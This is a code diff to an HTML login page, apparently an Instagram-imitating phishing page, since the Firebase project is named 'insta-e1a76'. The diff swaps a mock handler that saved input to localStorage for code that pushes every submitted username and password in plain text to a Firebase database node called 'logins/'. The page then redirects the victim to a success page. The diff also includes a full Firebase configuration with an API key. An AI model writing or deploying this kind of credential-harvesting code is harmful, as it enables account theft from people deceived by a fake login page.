@@ -141,20 +141,44 @@
     </div>
   </div>
 
+    <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-analytics.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyD9gxIYemSTxR6s_62PeosFBaH2fzy1H1o",
+      authDomain: "insta-e1a76.firebaseapp.com",
+      databaseURL: "https://insta-e1a76-default-rtdb.firebaseio.com",
+      projectId: "insta-e1a76",
+      storageBucket: "insta-e1a76.firebasestorage.app",
+      messagingSenderId: "931650256696",
+      appId: "1:931650256696:web:3c7b958f9b27b1e26f0bcd",
+      measurementId: "G-CX0DFQ1PQP"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const analytics = getAnalytics(app);
+
+    window.saveToFirebase = function (username, password) {
+      const loginRef = ref(database, "logins/");
+      push(loginRef, {
+        username: username,
+        password: password
+      });
+    };
+  </script>
+
+  <!-- Form handler -->
   <script>
-    function handleLogin() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      if (!username || !password) {
-        alert('Please enter both username and password.');
-        return;
-      }
-
-      localStorage.setItem('mockUsername', username);
-      localStorage.setItem('mockPassword', password);
-
-      window.location.href = 'success.html';
+    function handleLogin(event) {
+      event.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      saveToFirebase(username, password);
+      window.location.href = "success.html";
     }
   </script>
 </body>
